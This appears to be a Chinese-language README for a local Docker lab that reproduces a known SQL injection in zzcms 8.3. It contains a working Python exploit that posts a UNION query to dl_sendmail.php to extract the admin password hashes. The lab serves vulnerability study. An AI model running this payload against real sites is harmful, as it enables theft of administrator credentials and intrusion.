## 启动环境

```
docker-compose build
docker-compose up -d
```

zzcms 8.3 爆出的CVE漏洞很多，我这边选了文件危害性高的sql注入漏洞

## 0x01 前台sql注入
要想利用此漏洞必须现在前台注册一个普通用户账户[用户注册—zzcms](http://127.0.0.1:8002/reg/userreg.php)，然后编辑默认的短信信息
http://127.0.0.1:8002/user/index.php?gotopage=msg_manage.php

然后测试
![](README/luffy1.png)


python脚本
```
import requests

burp0_url = "http://127.0.0.1:8002/dl/dl_sendmail.php"
burp0_cookies = {"session": "db0e38ef-30cf-454c-a5a5-a41c8dd9d05b", "bdshare_firstime": "1535071918348", "PHPSESSID": "dpbqepggda4ocq68ok6ellbnj7", "__tins__713776": "%7B%22sid%22%3A%201535075799812%2C%20%22vd%22%3A%207%2C%20%22expires%22%3A%201535078558802%7D", "__51cke__": "", "__51laig__": "7", "UserName": "luffy", "PassWord": "3bf1114a986ba87ed28fc1b5884fc2f8"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
burp0_data={"sql": "select email from zzcms_dl where id=-1 union select pass from zzcms_admin #"}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

```



[链接一](https://mp.weixin.qq.com/s/ROgA0e9qExM7P7p3cwqUnQ)

[链接二](https://www.anquanke.com/post/id/156850)

[链接三](https://github.com/AvaterXXX/ZZCMS/blob/master/README.md)
